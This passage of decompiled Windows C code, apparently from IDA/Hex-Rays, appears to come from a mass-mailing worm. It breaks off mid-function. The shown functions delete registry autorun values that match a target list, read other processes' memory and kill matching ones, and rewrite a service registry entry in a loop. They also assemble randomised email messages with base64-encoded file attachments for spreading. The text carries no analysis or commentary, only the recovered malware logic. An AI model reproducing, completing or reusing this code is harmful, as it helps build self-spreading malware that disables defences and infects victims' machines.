    v15 = v11 + 1;
    v26 = ((unsigned __int8)v25[2] >> 6) + 4 * (v10 & 0xF);
    if ( v15 && v7 > 0 && !((v15 - v24) % v7) )
    {
      *(_BYTE *)(v15 + v8) = 13;
      v16 = v15 + 1;
      *(_BYTE *)(v16 + v8) = 10;
      v15 = v16 + 1;
      v24 += 2;
    }
    *(_BYTE *)(v15 + v8) = *((_BYTE *)off_40F030 + v26);
    v17 = v15 + 1;
    if ( v23 <= 2 )
      *(_BYTE *)(v17 + v8 - 1) = 61;
    v18 = v14 & 0x3F;
    if ( v17 && v7 > 0 && !((v17 - v24) % v7) )
    {
      *(_BYTE *)(v17 + v8) = 13;
      v19 = v17 + 1;
      *(_BYTE *)(v19 + v8) = 10;
      v17 = v19 + 1;
      v24 += 2;
    }
    *(_BYTE *)(v17 + v8) = *((_BYTE *)off_40F030 + v18);
    v5 = v17 + 1;
    if ( v23 <= 1 )
      *(_BYTE *)(v5 + v8 - 1) = 61;
    v4 = v21 + 3;
    v22 -= 3;
    v21 += 3;
  }
  return v5;
}
// 40F030: using guessed type void *off_40F030;

//----- (00401198) --------------------------------------------------------
LSTATUS sub_401198()
{
  char *v0; // eax
  LSTATUS result; // eax
  int i; // edi
  char *v3; // eax
  HMODULE LibraryA; // esi
  char *v5; // eax
  FARPROC ProcAddress; // eax
  CHAR Name[260]; // [esp+0h] [ebp-110h] BYREF
  int v8; // [esp+104h] [ebp-Ch]
  DWORD dwIndex; // [esp+108h] [ebp-8h]
  HKEY phkResult; // [esp+10Ch] [ebp-4h] BYREF

  dwIndex = 0;
  v0 = sub_40347E(SubKey, 4);
  result = RegOpenKeyA(HKEY_LOCAL_MACHINE, v0, &phkResult);
  if ( !result )
  {
    v8 = sub_4034AE(aNv, 0);
    while ( !RegEnumKeyA(phkResult, dwIndex, Name, 0x104u) )
    {
      _strupr(Name);
      for ( i = 0; i < v8; ++i )
      {
        v3 = sub_40347E(aNv, i);
        if ( sub_403C88(Name, v3) )
        {
          LibraryA = LoadLibraryA(LibFileName);
          if ( LibraryA )
          {
            v5 = sub_40347E(ProcName, 2);
            ProcAddress = GetProcAddress(LibraryA, v5);
            if ( ProcAddress )
              ((void (__stdcall *)(HKEY, CHAR *))ProcAddress)(phkResult, Name);
            FreeLibrary(LibraryA);
          }
        }
      }
      ++dwIndex;
    }
    return RegCloseKey(phkResult);
  }
  return result;
}

//----- (00401284) --------------------------------------------------------
int __stdcall sub_401284(HKEY hKey, LPCSTR lpSubKey)
{
  int v3; // ebx
  BYTE Data[1024]; // [esp+4h] [ebp-814h] BYREF
  CHAR ValueName[1024]; // [esp+404h] [ebp-414h] BYREF
  char *v6; // [esp+804h] [ebp-14h]
  DWORD Type; // [esp+808h] [ebp-10h] BYREF
  DWORD cchValueName; // [esp+80Ch] [ebp-Ch] BYREF
  DWORD cbData; // [esp+810h] [ebp-8h] BYREF
  DWORD dwIndex; // [esp+814h] [ebp-4h]
  HKEY hKeya; // [esp+820h] [ebp+8h]

  dwIndex = 0;
  cchValueName = 1024;
  cbData = 1024;
  if ( RegOpenKeyA(hKey, lpSubKey, (PHKEY)&lpSubKey) )
    return 0;
  hKeya = (HKEY)sub_4034AE(aNv, 0);
  while ( 1 )
  {
    v3 = 0;
    cchValueName = 1024;
    cbData = 1024;
    if ( RegEnumValueA((HKEY)lpSubKey, dwIndex, ValueName, &cchValueName, 0, &Type, Data, &cbData) )
      break;
    if ( Type != 1 )
      Data[0] = 0;
    _strupr(ValueName);
    _strupr((char *)Data);
    if ( (int)hKeya > 0 )
    {
      do
      {
        v6 = sub_40347E(aNv, v3);
        if ( sub_403C88(ValueName, v6) || sub_403C88((char *)Data, v6) || !strcmp(ValueName, Str2) )
          RegDeleteValueA((HKEY)lpSubKey, ValueName);
        ++v3;
      }
      while ( v3 < (int)hKeya );
    }
    ++dwIndex;
  }
  RegCloseKey((HKEY)lpSubKey);
  return 0;
}

//----- (004013A9) --------------------------------------------------------
int sub_4013A9()
{
  char Destination[512]; // [esp+4h] [ebp-200h] BYREF

  sub_401198();
  sub_403CE3(Destination, 2);
  sub_401284(HKEY_LOCAL_MACHINE, Destination);
  sub_403CE3(Destination, 6);
  return sub_401284(HKEY_LOCAL_MACHINE, Destination);
}

//----- (004013FA) --------------------------------------------------------
int __stdcall sub_4013FA(DWORD th32ProcessID, int a2)
{
  int v2; // ebx
  DWORD modBaseSize; // eax
  size_t v4; // eax
  int v5; // esi
  size_t v6; // ebx
  SIZE_T v7; // eax
  char *v8; // eax
  CHAR Filename[260]; // [esp+8h] [ebp-444h] BYREF
  MODULEENTRY32 me; // [esp+10Ch] [ebp-340h] BYREF
  char Destination[260]; // [esp+330h] [ebp-11Ch] BYREF
  HANDLE hObject; // [esp+434h] [ebp-18h]
  size_t MaxCount; // [esp+438h] [ebp-14h]
  char *String1; // [esp+43Ch] [ebp-10h]
  HANDLE hProcess; // [esp+440h] [ebp-Ch]
  SIZE_T NumberOfBytesRead; // [esp+444h] [ebp-8h] BYREF
  unsigned int v18; // [esp+448h] [ebp-4h]
  unsigned int th32ProcessIDa; // [esp+454h] [ebp+8h]

  v2 = 0;
  MaxCount = strlen(&::String1);
  sub_405449(0, Name);
  v18 = sub_4034AE(aOS, 0);
  GetModuleFileNameA(0, Filename, 0x104u);
  me.dwSize = 548;
  hObject = CreateToolhelp32Snapshot(8u, th32ProcessID);
  if ( Module32First(hObject, &me) )
  {
    strcpy(Destination, me.szExePath);
    if ( _strcmpi(Filename, Destination) )
    {
      hProcess = OpenProcess(0x1F0FFFu, 0, me.th32ProcessID);
      if ( hProcess )
      {
        memset(byte_4131D0, 0, sizeof(byte_4131D0));
        modBaseSize = me.modBaseSize;
        if ( me.modBaseSize >= 0x80000 )
          modBaseSize = 0x80000;
        NumberOfBytesRead = 0;
        if ( a2 || ReadProcessMemory(hProcess, me.modBaseAddr, byte_4131D0, modBaseSize, &NumberOfBytesRead) )
        {
          for ( th32ProcessIDa = 0; th32ProcessIDa < v18; ++th32ProcessIDa )
          {
            String1 = sub_40347E(aOS, th32ProcessIDa);
            v4 = strlen(String1);
            v5 = 0;
            v6 = v4;
            if ( a2 )
            {
              v7 = v4 + 110;
              NumberOfBytesRead = v6 + 110;
            }
            else
            {
              v7 = NumberOfBytesRead;
            }
            if ( v7 - v6 != 10 )
            {
              while ( _strnicmp(&::String1, &byte_4131D0[v5], MaxCount) )
              {
                if ( a2 || !_strnicmp(String1, &byte_4131D0[v5], v6) )
                {
                  TerminateProcess(hProcess, 0);
                  Sleep(0x32u);
                  v8 = sub_40347E(byte_410DF0, 1);
                  if ( !sub_403C88(Destination, v8) )
                    sub_403F05(Destination);
                  break;
                }
                if ( ++v5 >= NumberOfBytesRead - v6 - 10 )
                  goto LABEL_21;
              }
              th32ProcessIDa = v18 + 1;
            }
LABEL_21:
            ;
          }
        }
        CloseHandle(hProcess);
        v2 = 1;
      }
    }
  }
  CloseHandle(hObject);
  return v2;
}

//----- (004015FF) --------------------------------------------------------
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  int v1; // esi
  BOOL i; // eax
  int v3; // edi
  int v4; // esi
  char *v5; // eax
  char Filename[260]; // [esp+Ch] [ebp-238h] BYREF
  PROCESSENTRY32 pe; // [esp+110h] [ebp-134h] BYREF
  HANDLE hSnapshot; // [esp+238h] [ebp-Ch]
  int v9; // [esp+23Ch] [ebp-8h]
  int v10; // [esp+240h] [ebp-4h]

  v1 = 95;
  v10 = sub_4034AE(aNv, 0);
  while ( 1 )
  {
    v9 = (v1 + 1) % 100;
    if ( !(v9 % 10) )
      sub_4013A9();
    pe.dwSize = 296;
    hSnapshot = CreateToolhelp32Snapshot(2u, 0);
    for ( i = Process32First(hSnapshot, &pe); i; i = Process32Next(hSnapshot, &pe) )
    {
      _splitpath(pe.szExeFile, 0, 0, Filename, 0);
      _strupr(Filename);
      if ( !v9 )
        sub_4013FA(pe.th32ProcessID, 0);
      v3 = 0;
      v4 = 0;
      if ( v10 <= 0 )
        goto LABEL_15;
      do
      {
        v5 = sub_40347E(aNv, v4);
        if ( !_strcmpi(Filename, v5) && (v4 != v10 - 1 || dword_493900) )
        {
          v3 = 1;
          sub_4013FA(pe.th32ProcessID, 1);
          dword_41133C = 1;
        }
        ++v4;
      }
      while ( v4 < v10 );
      if ( !v3 )
LABEL_15:
        dword_41133C = 0;
    }
    CloseHandle(hSnapshot);
    if ( dword_4938F0 )
      sub_40464B(HKEY_LOCAL_MACHINE, Destination, ServiceName, &ApplicationName);
    Sleep(0x64u);
    v1 = v9;
  }
}
// 41133C: using guessed type int dword_41133C;
// 4938F0: using guessed type int dword_4938F0;
// 493900: using guessed type int dword_493900;

//----- (0040174B) --------------------------------------------------------
void *__thiscall sub_40174B(void *this)
{
  return this;
}

//----- (0040174E) --------------------------------------------------------
LPVOID __thiscall sub_40174E(int this, LPCSTR lpFileName, int a3, int a4)
{
  DWORD v5; // eax
  DWORD v6; // ebx
  HANDLE FileA; // eax
  DWORD FileSize; // eax
  bool v9; // zf
  HANDLE FileMappingA; // eax
  LPVOID result; // eax
  DWORD dwDesiredAccess; // [esp+Ch] [ebp-8h]
  DWORD FileSizeHigh; // [esp+10h] [ebp-4h] BYREF

  v5 = 0x80000000;
  v6 = 2;
  dwDesiredAccess = 4;
  FileSizeHigh = 0;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  if ( !a4 )
  {
    v5 = -1073741824;
    v6 = 4;
    dwDesiredAccess = 2;
  }
  if ( lpFileName )
  {
    FileA = CreateFileA(lpFileName, v5, 1u, 0, 3u, 0x20u, 0);
    *(_DWORD *)this = FileA;
    if ( FileA == (HANDLE)-1 )
      return 0;
    FileSize = GetFileSize(FileA, &FileSizeHigh);
    v9 = FileSizeHigh == 0;
    *(_DWORD *)(this + 12) = FileSize;
    if ( !v9 )
    {
LABEL_9:
      CloseHandle(*(HANDLE *)this);
      return 0;
    }
    if ( a3 )
      *(_DWORD *)a3 = FileSize;
  }
  FileMappingA = CreateFileMappingA(*(HANDLE *)this, 0, v6, 0, 0, 0);
  *(_DWORD *)(this + 4) = FileMappingA;
  if ( !FileMappingA )
    goto LABEL_9;
  result = MapViewOfFile(FileMappingA, dwDesiredAccess, 0, 0, 0);
  *(_DWORD *)(this + 8) = result;
  if ( result )
    return result;
  CloseHandle(*(HANDLE *)(this + 4));
  CloseHandle(*(HANDLE *)this);
  return 0;
}

//----- (00401808) --------------------------------------------------------
HANDLE __thiscall sub_401808(int this)
{
  HANDLE result; // eax

  if ( *(_DWORD *)(this + 8) )
    UnmapViewOfFile(*(LPCVOID *)(this + 8));
  if ( *(_DWORD *)(this + 4) )
    CloseHandle(*(HANDLE *)(this + 4));
  result = *(HANDLE *)this;
  if ( *(_DWORD *)this )
    result = (HANDLE)CloseHandle(*(HANDLE *)this);
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  return result;
}

//----- (00401841) --------------------------------------------------------
char *__cdecl sub_401841(char *Destination)
{
  char *result; // eax
  bool v2; // zf
  char *v3; // eax

  *((_DWORD *)Destination + 583) = sub_4047B6(0) & 1;
  sub_40372F(Destination + 2232, 10, 38, 7);
  if ( FullPath )
    strcpy(Destination + 1972, &FullPath);
  sub_401A1E(Destination);
  result = (char *)toupper(Destination[300]);
  v2 = Destination[428] == 0;
  Destination[300] = (char)result;
  if ( v2 )
    *((_DWORD *)Destination + 583) = 1;
  if ( !Destination[1712] )
  {
    v3 = sub_40347E(&byte_4101DC, *((_DWORD *)Destination + 584));
    return sub_404261(Destination + 1712, 0, v3, 1);
  }
  return result;
}

//----- (004018E9) --------------------------------------------------------
int __cdecl sub_4018E9(int a1)
{
  int v1; // ebx
  int *v2; // edi
  signed __int16 v3; // cx
  char *v4; // ebx
  int v5; // esi
  char *v6; // edi
  char *v7; // eax
  unsigned int v8; // eax
  char *v9; // eax
  struct _SYSTEMTIME SystemTime; // [esp+Ch] [ebp-1Ch] BYREF
  int v12; // [esp+1Ch] [ebp-Ch]
  int v13; // [esp+20h] [ebp-8h]
  int v14; // [esp+24h] [ebp-4h] BYREF

  GetLocalTime(&SystemTime);
  v1 = 0;
  v12 = sub_4034AE(aO_0, 0);
  if ( v12 <= 0 )
    return 0;
  v2 = (int *)&unk_40D218;
  do
  {
    v14 = *v2;
    v13 = v14;
    sub_404B75((__int16 *)&v14, -((int)v2 >= (int)&unk_40D228 ? 5 : 15));
    v3 = v13;
    if ( (__int16)v14 > (__int16)v13 )
    {
      v3 = v13 + 12;
      HIWORD(v13) += 30;
    }
    if ( (__int16)v14 <= (int)SystemTime.wMonth
      && SystemTime.wMonth <= v3
      && SHIWORD(v14) <= (int)SystemTime.wDay
      && SystemTime.wDay <= SHIWORD(v13) + 2 )
    {
      break;
    }
    ++v1;
    ++v2;
  }
  while ( v1 < v12 );
  if ( v1 >= v12 )
    return 0;
  v4 = sub_40347E(aO_0, v1);
  v5 = sub_4047B6(0) & 1;
  v6 = (char *)(a1 + 300);
  v7 = sub_40347E(&byte_410766, v5);
  strcpy((char *)(a1 + 300), v7);
  if ( !(sub_4047B6(0) % 3u) || v5 )
  {
    v8 = sub_4047B6(0);
    v9 = sub_40347E(&byte_4103A4, v8 % 6);
    strcat(v6, v9);
    strcat(v6, asc_40F038);
  }
  strcat(v6, v4);
  return 1;
}

//----- (00401A1E) --------------------------------------------------------
char *__cdecl sub_401A1E(char *Destination)
{
  unsigned int v2; // edi
  char *result; // eax
  unsigned int v4; // eax
  char *v5; // edi
  char v6; // al
  char *v7; // eax
  unsigned int v8; // eax
  char v9; // al
  char *v10; // eax
  char v11; // al
  char *v12; // eax
  int v13; // edi
  char v14; // al
  char *v15; // ebx
  char *v16; // eax
  char *v17; // eax
  char *v18; // [esp-4h] [ebp-C18h]
  char *v19; // [esp-4h] [ebp-C18h]
  char v20[1024]; // [esp+Ch] [ebp-C08h] BYREF
  char v21[1024]; // [esp+40Ch] [ebp-808h] BYREF
  char Source[1024]; // [esp+80Ch] [ebp-408h] BYREF
  char *Buffer; // [esp+C0Ch] [ebp-8h]
  char *v24; // [esp+C10h] [ebp-4h]
  char *Destinationa; // [esp+C1Ch] [ebp+8h]

  v24 = 0;
  v20[0] = 0;
  sub_403BB8((int)(Destination + 100), (int)v20, v21);
  Buffer = Destination + 428;
  Destination[428] = 0;
  v20[100] = 0;
  Source[0] = 0;
  Destinationa = Destination + 300;
  *Destinationa = 0;
  Destination[1712] = 0;
  v2 = sub_4034AE(&byte_4101DC, 0);
  *((_DWORD *)Destination + 584) = sub_4047B6(0) % v2;
  if ( (sub_4047B6(0) & 3) == 0 )
  {
    result = (char *)sub_4018E9((int)Destination);
    if ( result )
      return result;
  }
  if ( !(sub_4047B6(0) % 0x18u) )
  {
    *((_DWORD *)Destination + 583) = 0;
    strcpy(Destinationa, aOys);
    return (char *)sprintf(Buffer, Format, Destination + 200);
  }
  if ( !(sub_4047B6(0) % 0x18u) )
  {
    v24 = (char *)1;
LABEL_7:
    if ( !(sub_4047B6(0) % 3u) || v24 )
    {
      v13 = sub_4047B6(0) % 5u;
      if ( v24 )
        v13 = 0;
      v24 = (char *)dword_40D1F0[v13];
      Buffer = (char *)dword_40D204[v13];
      v24 += sub_4047B6(0) % (unsigned int)Buffer;
      if ( v13 >= 4 )
      {
        v19 = sub_40347E(&byte_4103A4, (int)v24);
        v17 = sub_40347E(asc_410354, v13);
        sprintf(Source, v17, v19);
      }
      else
      {
        if ( (sub_4047B6(0) & 1) != 0 || v13 == 3 )
        {
          v15 = byte_4131A0;
        }
        else
        {
          v14 = sub_4047B6(0);
          v15 = sub_40347E(&byte_4105A8, (v14 & 1) + 8);
        }
        v18 = sub_40347E(&byte_4103A4, (int)v24);
        v16 = sub_40347E(asc_410354, v13);
        sprintf(Source, v16, v15, v18);
      }
      strcpy(Destinationa, Source);
      return sub_401E02((int)Destination, v13, v24);
    }
    else
    {
      Buffer = (char *)sub_4034AE(&byte_4103F2, 0);
      v4 = sub_4047B6(0);
      v5 = sub_40347E(&byte_4103F2, v4 % (unsigned int)Buffer);
      if ( sub_4047B6(0) % 3u )
      {
        return strcpy(Destinationa, v5);
      }
      else if ( sub_4047B6(0) % 0xAu )
      {
        v11 = sub_4047B6(0);
        v12 = sub_40347E(&byte_410310, v11 & 3);
        strcpy(Destinationa, v12);
        if ( (sub_4047B6(0) & 1) != 0 )
        {
          strcat(Destinationa, v20);
          strcat(Destinationa, asc_40F03C);
        }
        *v5 = tolower(*v5);
        return strcat(Destinationa, v5);
      }
      else
      {
        v6 = sub_4047B6(0);
        v7 = sub_40347E(&byte_410310, (v6 & 1) + 4);
        sprintf(Destinationa, v7, v5);
        return sub_40220C((int)Destination, v5);
      }
    }
  }
  if ( (sub_4047B6(0) & 0x1F) == 0 )
    return strcpy(Destinationa, asc_40F038);
  if ( (sub_4047B6(0) & 1) != 0 || !byte_4937EC[0] || !sub_403A4F(byte_4937EC, Source, 8, 50, 1) )
    goto LABEL_7;
  *((_DWORD *)Destination + 583) = 1;
  v8 = sub_4047B6(0);
  v21[0] = 0;
  if ( v8 % 0xA )
  {
    strcpy(Destinationa, Source);
    result = (char *)sub_4047B6(0);
    if ( ((unsigned __int8)result & 0x3F) == 0 )
    {
      v21[0] = 0;
      sub_403A4F(byte_4937EC, v21, 8, 800, 1);
      return strcpy(Buffer, v21);
    }
  }
  else
  {
    v9 = sub_4047B6(0);
    v10 = sub_40347E(&byte_410310, (v9 & 1) + 4);
    sprintf(Destinationa, v10, Source);
    return sub_40220C((int)Destination, Source);
  }
  return result;
}
// 40D1F0: using guessed type int dword_40D1F0[4];
// 40D204: using guessed type int dword_40D204[5];

//----- (00401E02) --------------------------------------------------------
char *__cdecl sub_401E02(int a1, int a2, char *Destination)
{
  char v3; // al
  char *v4; // edi
  char *v5; // eax
  char v6; // al
  unsigned int v7; // eax
  char *v8; // eax
  char v9; // al
  char *v10; // eax
  char *v11; // eax
  unsigned int v12; // eax
  char *v13; // eax
  unsigned int v15; // edi
  unsigned int v16; // eax
  char v17; // al
  char *v18; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  char v27; // al
  char *v28; // eax
  char *v29; // [esp-8h] [ebp-274h]
  char *v30; // [esp-4h] [ebp-270h]
  char *v31; // [esp-4h] [ebp-270h]
  char *v32; // [esp-4h] [ebp-270h]
  char v33[200]; // [esp+Ch] [ebp-260h] BYREF
  char Source[200]; // [esp+D4h] [ebp-198h] BYREF
  char Buffer[200]; // [esp+19Ch] [ebp-D0h] BYREF
  char *v36; // [esp+264h] [ebp-8h]
  unsigned int v37; // [esp+268h] [ebp-4h]
  char *v38; // [esp+278h] [ebp+Ch]
  char *Destinationa; // [esp+27Ch] [ebp+10h]
  const char *Destinationb; // [esp+27Ch] [ebp+10h]

  if ( a2 == 4 )
  {
    LOBYTE(v37) = sub_4047B6(0) & 1;
    v37 = (unsigned __int8)v37;
    *(_DWORD *)(a1 + 2332) = 0;
    *(_DWORD *)(a1 + 2336) = 0;
    v15 = sub_4034AE(aOx, 0);
    v16 = sub_4047B6(0);
    v36 = sub_40347E(aOx, v16 % v15);
    strcpy(Source, v36);
    if ( (sub_4047B6(0) & 1) != 0 )
    {
      v38 = byte_4131A0;
    }
    else
    {
      v17 = sub_4047B6(0);
      v38 = sub_40347E(&byte_4105A8, (v17 & 1) + 8);
    }
    v18 = sub_40347E(&byte_4105A8, 4);
    sprintf(Buffer, v18, v38);
    strcat(Source, Buffer);
    Destinationb = sub_40347E(&byte_4103A4, (int)Destination);
    v20 = sub_40347E(asc_410354, 4);
    sprintf(Buffer, v20, Destinationb);
    strcat(Source, Buffer);
    strcpy(Buffer, Destinationb);
    v32 = sub_40347E(&byte_4105A8, (int)(Destination - 3));
    v21 = sub_40347E(&byte_4105A8, 5);
    sprintf(v33, v21, v38, v32);
    strcat(Buffer, v33);
    if ( v37 )
    {
      strcpy((char *)(a1 + 428), Source);
      strcat((char *)(a1 + 428), aZs);
      v22 = Buffer;
    }
    else
    {
      strcpy((char *)(a1 + 428), Buffer);
      strcat((char *)(a1 + 428), aZs);
      v22 = Source;
    }
    strcat((char *)(a1 + 428), v22);
    strcat((char *)(a1 + 428), aZs);
    strcat((char *)(a1 + 428), aZs);
    v23 = sub_40347E(&byte_4105A8, 13);
    strcat((char *)(a1 + 428), v23);
    v24 = sub_40347E(&byte_4105A8, 10);
    strcat((char *)(a1 + 428), v24);
    v25 = sub_40347E(&byte_4105A8, 11);
    strcat((char *)(a1 + 428), v25);
    strcat((char *)(a1 + 428), v36);
    v26 = sub_40347E(&byte_4105A8, 12);
    strcat((char *)(a1 + 428), v26);
    *(_DWORD *)(a1 + 2332) = 0;
    v27 = sub_4047B6(0);
    v28 = sub_40347E(aU_1, v27 & 1);
    strcpy((char *)(a1 + 1712), v28);
    return strcat((char *)(a1 + 1712), &byte_4101DC);
  }
  else
  {
    if ( (sub_4047B6(0) & 1) != 0 || a2 == 3 )
    {
      v4 = byte_4131A0;
    }
    else
    {
      v3 = sub_4047B6(0);
      v4 = sub_40347E(&byte_4105A8, (v3 & 1) + 8);
    }
    v30 = sub_40347E(&byte_4103A4, (int)Destination);
    v5 = sub_40347E(asc_410354, a2);
    sprintf(Source, v5, v4, v30);
    v6 = sub_4047B6(0);
    v31 = sub_40347E(&byte_4105A8, (v6 & 1) + 16);
    v7 = sub_4047B6(0);
    v29 = sub_40347E(&byte_4105A8, v7 % 3 + 18);
    v8 = sub_40347E(&byte_4105A8, 15);
    sprintf(Buffer, v8, v29, v31);
    if ( (sub_4047B6(0) & 1) == 0 )
    {
      v9 = sub_4047B6(0);
      v10 = sub_40347E(&byte_410310, v9 & 1);
      strcpy((char *)(a1 + 428), v10);
    }
    Destinationa = (char *)(a1 + 428);
    v11 = sub_40347E(&byte_4105A8, 14);
    strcat((char *)(a1 + 428), v11);
    strcat((char *)(a1 + 428), Source);
    if ( !a2 )
    {
      strcat(Destinationa, aZs);
      strcat(Destinationa, &byte_410933);
      *(_DWORD *)(a1 + 2332) = 0;
      *(_DWORD *)(a1 + 2336) = 0;
      v37 = sub_4034AE(aU_1, 0);
      v12 = sub_4047B6(0);
      v13 = sub_40347E(aU_1, v12 % v37);
      strcpy((char *)(a1 + 1712), v13);
      strcat((char *)(a1 + 1712), &byte_4101DC);
    }
    strcat(Destinationa, aZs);
    return strcat(Destinationa, Buffer);
  }
}

//----- (0040220C) --------------------------------------------------------
char *__cdecl sub_40220C(int a1, char *Source)
{
  char *v2; // eax
  char *v3; // eax
  char v4; // al
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  char *result; // eax
  char Destination[100]; // [esp+10h] [ebp-64h] BYREF

  sprintf((char *const)(a1 + 428), &byte_4105A8, a1 + 200);
  strcat((char *)(a1 + 428), aZs);
  strcat((char *)(a1 + 428), aZs);
  strcat((char *)(a1 + 428), aSy);
  strcat((char *)(a1 + 428), (const char *)(a1 + 100));
  strcat((char *)(a1 + 428), aZs);
  v2 = sub_40347E(aSy, 1);
  strcat((char *)(a1 + 428), v2);
  strcat((char *)(a1 + 428), (const char *)(a1 + 200));
  strcat((char *)(a1 + 428), aZs);
  v3 = sub_40347E(aSy, 2);
  strcat((char *)(a1 + 428), v3);
  strcat((char *)(a1 + 428), Source);
  strcat((char *)(a1 + 428), aZs);
  v4 = sub_4047B6(0);
  v5 = sub_40347E(&byte_4105A8, (v4 & 1) + 1);
  strcat((char *)(a1 + 428), v5);
  v6 = sub_40347E(&byte_4105A8, 3);
  strcat((char *)(a1 + 428), v6);
  sub_403BB8(a1 + 100, 0, Destination);
  v7 = sub_40347E(aE, 1);
  strcpy((char *)(a1 + 200), v7);
  result = strcat((char *)(a1 + 200), Destination);
  *(_DWORD *)(a1 + 2332) = 0;
  return result;
}

//----- (00402319) --------------------------------------------------------
char *__cdecl sub_402319(char *a1, char *Destination)
{
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  const char *v8; // eax
  const CHAR *v9; // ebx
  unsigned int v10; // eax
  char *v11; // eax
  char Source[1024]; // [esp+Ch] [ebp-868h] BYREF
  char Ext[1024]; // [esp+40Ch] [ebp-468h] BYREF
  char v15[100]; // [esp+80Ch] [ebp-68h] BYREF
  int v16; // [esp+870h] [ebp-4h] BYREF
  int v17; // [esp+87Ch] [ebp+8h]
  char *v18; // [esp+87Ch] [ebp+8h]
  char *v19; // [esp+87Ch] [ebp+8h]
  char *Destinationa; // [esp+880h] [ebp+Ch]

  strcpy(Destination, aSy);
  sub_403BB8((int)(a1 + 200), (int)Ext, Source);
  sprintf(Source, aOu, Ext, a1 + 200);
  strcat(Destination, Source);
  strcat(Destination, aE);
  v4 = sub_40347E(aSy, 1);
  strcat(Destination, v4);
  strcat(Destination, a1 + 100);
  strcat(Destination, aE);
  v5 = sub_40347E(aSy, 2);
  strcat(Destination, v5);
  strcat(Destination, a1 + 300);
  strcat(Destination, aE);
  strcat(Destination, aUtuwm);
  Destinationa = a1 + 2232;
  strcat(Destination, a1 + 2232);
  strcat(Destination, aE);
  strcat(Destination, aE);
  sub_40372F(v15, 8, 20, 7);
  sub_40264B(Destination, a1 + 2232, 1);
  v6 = aE;
  if ( *((_DWORD *)a1 + 583) )
  {
    sprintf(Source, aE_0, v15);
    v6 = Source;
  }
  sprintf(Ext, aOy, v6);
  strcat(Destination, Ext);
  strcat(Destination, a1 + 428);
  strcat(Destination, aIO);
  strcat(Destination, aE);
  strcat(Destination, aE);
  v17 = sub_4047B6(0) & 1;
  if ( !*((_DWORD *)a1 + 583) )
    v17 = 2;
  sub_40264B(Destination, Destinationa, 1);
  v7 = sub_40347E(asc_4108C1, v17);
  sprintf(Ext, aOy_0, v7, a1 + 1712, v15);
  strcat(Destination, Ext);
  strcat(Destination, aE);
  strcat(Destination, aE);
  v8 = (const char *)sub_4041C8(a1 + 1452, (int)&v16, 1);
  v18 = (char *)v8;
  if ( v8 )
  {
    strcat(Destination, v8);
    operator delete(v18);
  }
  strcat(Destination, aE);
  v9 = a1 + 1972;
  if ( *v9 )
  {
    v10 = sub_403E16(v9);
    v16 = v10;
    if ( v10 < 0xC800 || v10 < 0x7D000 && (sub_4047B6(0) & 1) != 0 )
    {
      v19 = (char *)sub_4041C8(v9, (int)&v16, 0);
      if ( v19 )
      {
        sub_40264B(Destination, Destinationa, 1);
        sub_40264B(Destination, Destinationa, 1);
        _splitpath(v9, 0, 0, Source, Ext);
        strcat(Source, Ext);
        v11 = sub_40347E(asc_4108C1, 2);
        sprintf(Ext, aOy_0, v11, Source, v15);
        strcat(Destination, Ext);
        strcat(Destination, aE);
        strcat(Destination, aE);
        strcat(Destination, v19);
        strcat(Destination, aE);
        operator delete(v19);
      }
    }
  }
  sub_40264B(Destination, Destinationa, 0);
  return strcat(Destination, asc_40F040);
}

//----- (0040264B) --------------------------------------------------------
char *__cdecl sub_40264B(char *Destination, char *Source, int a3)
{
  char *result; // eax

  strcat(Destination, asc_40F040);
  result = strcat(Destination, Source);
  if ( a3 )
    return strcat(Destination, aE);
  return result;
}

//----- (00402680) --------------------------------------------------------
DWORD __cdecl sub_402680(_DWORD *a1)
{
  DWORD CurrentProcessId; // eax
  DWORD LastError; // eax
  HLOCAL v4; // eax
  HLOCAL v5; // eax
  PSID *v6; // esi
  PSID pSid1; // [esp+Ch] [ebp-30h]
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+14h] [ebp-28h] BYREF
  HANDLE hObject; // [esp+1Ch] [ebp-20h]
  int v11; // [esp+20h] [ebp-1Ch]
  PSID pSid; // [esp+24h] [ebp-18h] BYREF
  PSID pSid2; // [esp+28h] [ebp-14h] BYREF
  HANDLE TokenHandle; // [esp+2Ch] [ebp-10h] BYREF
  SIZE_T uBytes; // [esp+30h] [ebp-Ch] BYREF
  HLOCAL hMem; // [esp+34h] [ebp-8h]
  DWORD v17; // [esp+38h] [ebp-4h]
  unsigned int v18; // [esp+44h] [ebp+8h]

  CurrentProcessId = GetCurrentProcessId();
  TokenHandle = 0;
  uBytes = 50;
  hMem = 0;
  pIdentifierAuthority.Value[0] = 0;
  pIdentifierAuthority.Value[1] = 0;
  pIdentifierAuthority.Value[2] = 0;
  pIdentifierAuthority.Value[3] = 0;
  pIdentifierAuthority.Value[4] = 0;
  pIdentifierAuthority.Value[5] = 5;
  pSid = 0;
  pSid2 = 0;
  v17 = 0;
  v11 = 0;
  *a1 = 0;
  hObject = OpenProcess(0x1F0FFFu, 0, CurrentProcessId);
  if ( !OpenProcessToken(hObject, 8u, &TokenHandle) || (v4 = LocalAlloc(0, uBytes), (hMem = v4) == 0) )
  {
    LastError = GetLastError();
LABEL_3:
    v17 = LastError;
    goto LABEL_23;
  }
  if ( !GetTokenInformation(TokenHandle, TokenGroups, v4, uBytes, &uBytes)
    && (GetLastError() != 122
     || (LocalFree(hMem), v5 = LocalAlloc(0, uBytes), (hMem = v5) == 0)
     || !GetTokenInformation(TokenHandle, TokenGroups, v5, uBytes, &uBytes))
    || !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 4u, 0, 0, 0, 0, 0, 0, 0, &pSid)
    || !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 6u, 0, 0, 0, 0, 0, 0, 0, &pSid2) )
  {
    LastError = GetLastError();
    goto LABEL_3;
  }
  v18 = 0;
  if ( *(_DWORD *)hMem )
  {
    v6 = (PSID *)((char *)hMem + 4);
    while ( 1 )
    {
      pSid1 = *v6;
      if ( EqualSid(*v6, pSid) )
      {
        v11 = 1;
        *a1 = 0;
        goto LABEL_20;
      }
